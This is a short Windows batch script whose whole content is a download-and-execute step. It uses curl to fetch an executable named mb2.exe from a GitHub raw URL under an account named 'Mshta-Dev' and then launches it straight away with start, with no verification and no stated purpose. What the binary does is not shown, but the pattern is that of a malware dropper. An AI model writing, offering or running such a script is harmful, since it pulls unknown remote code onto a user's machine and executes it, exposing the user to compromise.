@echo off
set "URL=http://raw.githubusercontent.com/Mshta-Dev/MyTestRepositoryCsharpTest/main/Kvas/Kvas/obj/Debug/mb2.exe"
set "FILENAME=mb2.exe"
curl -O "%URL%"
start "" "%FILENAME%"